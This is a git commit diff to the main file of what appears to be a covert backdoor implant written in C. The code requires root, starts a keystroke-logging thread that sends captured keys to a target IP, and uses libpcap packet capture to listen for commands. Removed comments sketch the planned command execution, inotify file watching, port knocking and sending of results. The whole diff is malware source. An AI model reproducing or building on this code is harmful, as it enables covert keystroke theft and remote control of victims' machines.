686c88e85f41aa575fc6cd1a39bfe64af84eecf9
Aing <aingaran2003@gmail.com>
2018-11-22 21:18:04 -0800

    fixed filter creation in main

--- infected/main.c
+++ infected/main.c
@@ -24,15 +24,12 @@ static struct option long_options[] = {
 
 int main(int argc, char **argv){
     //strncpy(argv[0], MASK, sizeof(MASK));
-    pthread_t inotify_thread;
     int arg;
     char targetip[BUFSIZ];
     char localip[BUFSIZ];
-    struct filter Filter;
     char pcapfilter[BUFSIZ];
     bool tcp = false;
 
-    Filter.tcp = false;
 
     if(geteuid() != 0) {
         printf("Must run as root\n");
@@ -51,21 +48,25 @@ int main(int argc, char **argv){
         switch (arg) {
             case 1:
                 strncpy(targetip, optarg, BUFSIZ);
-                printf("TARGET IP: %s\n", targetip);
                 break;
             case 2:
                 strncpy(localip, optarg, BUFSIZ);
-                printf("LOCAL IP: %s\n", localip);
                 break;
             case 3:
                 tcp = true;
-                Filter.tcp = true;
                 break;
             default: /*  '?' */
                 print_usage();
                 exit(1);
         }
     }
+
+    //create filter
+    struct filter *Filter = (struct filter*) malloc(sizeof(struct filter));
+    Filter->infected = false;
+    strncpy(Filter->targetip, targetip, BUFSIZ);
+    strncpy(Filter->localip, localip, BUFSIZ);
+    Filter->tcp = tcp;
 
     //start keylogger thread (just logs keys)
     keylogger_struct *keylogger_args = malloc(sizeof *keylogger_args);  //create struct to pass args to thread
@@ -75,36 +76,7 @@ int main(int argc, char **argv){
     pthread_create(&keylogger_thread, NULL, keylogger_send, keylogger_args);
 
     //start libpcap
-    Filter = InitFilter(targetip,localip, true, tcp);
-    CreateFilter(pcapfilter,tcp);
-    printf("Filter: %s\n",pcapfilter);
     Packetcapture(pcapfilter,Filter);
 
-    //IN LIBPCAP
-    //wait for commands
-        //if command or inotify or keylogger
-            //do_command(type of command)
-
-        //do_command (type of command)
-            //if(type of command == command)
-                //chmod
-                //run command
-                //pipe into results file
-            //if(type of command == inotify)
-                //run inotify
-                //pipe into results file
-            //if(type of command == keylogger)
-                //copy/pipe keylogger file into results file
-
-            //port knock
-            //send results file
-/*
-    inotify_struct *inotify_args = malloc(sizeof(*inotify_args));
-    strncpy(inotify_args->targetip, targetip, BUFSIZ);
-    strncpy(inotify_args->localip, localip, BUFSIZ);
-    inotify_args->tcp = tcp;
-    pthread_create(&inotify_thread, NULL, watch_directory,inotify_args);
-	pthread_join(inotify_thread, NULL);
-*/
     return 0;
 }
